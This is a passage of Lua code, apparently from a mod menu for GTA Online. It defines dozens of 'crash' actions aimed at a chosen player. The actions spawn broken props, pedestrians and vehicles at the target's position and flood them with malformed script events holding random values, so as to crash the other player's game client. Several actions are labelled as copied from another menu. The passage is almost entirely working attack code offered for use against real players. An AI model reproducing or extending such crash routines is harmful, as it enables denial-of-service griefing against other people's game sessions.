            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(modelc, "Modelo Invalido V3", {"crashv10"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(modelc, "Modelo Invalido V4", {"crashv12"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)

    menu.action(modelc, "Modelo Invalido V5", {"crashv18"}, "Skid from x-force", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(player_id)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(player_id) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)


    menu.action(modelc, "Modelo Invalido V6", {"crashv19"}, "Skid from x-force", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(modelc, "Modelo Invalido V7", {"crashv26"}, "Skid from x-force", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    local pclpid = {}

    menu.action(modelc, "Modelo Invalido V8 'Test'", {"crashv28"}, "Clona al jugador repetidas veces causando (XC)", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                ryze.get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(modelc, "Big Chunxus Cwash'", {"crashv27"}, "Skid from x-force (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        local animation_tonta = ("anim@mp_player_intupperstinker")
        ryze.anim_request(animation_tonta)
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        --menu.trigger_commands("anticrashcam")
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos, 0)
            local ped_ = entities.create_ped(1, mdl2, pos, 0)
            local ped3 = entities.create_ped(1, mdl3, pos, 0)
            local ped3 = entities.create_ped(1, mdl4, pos, 0)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
            util.yield(100)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            --ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            --ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            --ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, true, false, true)
            --ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, true, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            util.yield(200)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
        --menu.trigger_commands("anticrashcam")
    end)

    local scrcrash = menu.list(twotake, "Script Crashes", {}, "")

    local secrcrash = menu.list(twotake, "SE Crashes", {}, "")

    menu.action(secrcrash, "SE Crash (S0)", {"crashv54"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
    end)

    menu.action(secrcrash, "SE Crash (S1)", {"crashv97"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
    end)

    menu.action(secrcrash, "SE Crash (S3)", {"crashv84"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            end
    end)

    menu.action(secrcrash, "SE Crash (S4)", {"crashv51"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            end
        end)

    menu.action(secrcrash, "SE Crash (S7)", {"crashv91"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
    end)

    menu.action(scrcrash, "Script Crash V1", {"crashv61"}, "", function()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
        end
    
    end)

    menu.action(scrcrash, "Script Crash V2", {"crashv7"}, "", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(scrcrash, "Script Crash V3", {"crashv8"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
    end)

    menu.action(scrcrash, "Script Crash V4", {"crashv9"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 20 do
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
